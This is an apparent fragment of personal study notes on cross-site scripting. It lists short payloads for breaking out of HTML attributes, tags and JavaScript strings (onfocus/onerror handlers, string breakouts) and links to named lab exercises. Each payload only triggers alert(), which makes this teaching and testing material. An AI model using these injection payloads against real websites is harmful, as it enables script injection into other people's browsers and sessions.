
EX:

* `<input><script>alert(1);</script></input`

html tag attribute context:
* [[XSS_examples#Stored XSS into anchor `href` attribute with double quotes HTML-encoded| `javascript:alert(1)`]]
- [[XSS_examples#Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped| into onclick event with <>" htmlencoded and '\ escaped]]

EX:

* [[XSS_examples#angle brackets encoded| angle brackets encoded]]

* HTML context

	between html tags: (add new html tags `<script>` or `<img>`)
		* [[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| most tags and attr blocked]]
		* [[XSS_examples#Reflected XSS just custom tags allowed| only custom tags allowed]]
		* [[XSS_examples#Reflected XSS event handlers and `href` attributes blocked| SVG and <animate> allowed]]
		* [[XSS_examples#Reflected XSS with some SVG markup allowed| SVG markup allowed]]
	into html tags:
		* terminate the attribute value, close the tag, and introduce a new one 
			`"><script>alert(document.domain)</script>`
		* if `<>` encoded: add a new attribute that creates a scriptable context:
			`" autofocus onfocus=alert(document.domain) x="`
		*  with angle brackets encoded: `"onmouseover="alert(1)`
		* [[XSS_examples#Reflected XSS in canonical link tag| canonical link tag]]
		
* javascript context:
	* close the script tag and add new html tags:
	`</script><img src=1 onerror=alert(document.domain)>`
	
	* if the context is inside a quoted string literal break out of a string and execute js directly and repair the rest. example payloads:

	```js
		'-alert(document.domain)-'
		';alert(document.domain)//	
	```

	* [[XSS_examples#Reflected XSS into a JavaScript string with angle brackets HTML encoded| angle brackets encoded]]
	* [[XSS_examples#Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped| single quotes escaped]]
	- [[XSS_examples#Reflected XSS in a javascript URL with some characters blocked| some characters blocked]]
	- [[XSS_examples#Reflected XSS into a JavaScript template literals, with `<>'" ` unicode escaped| '"<> and backtick escaped, js template literals]]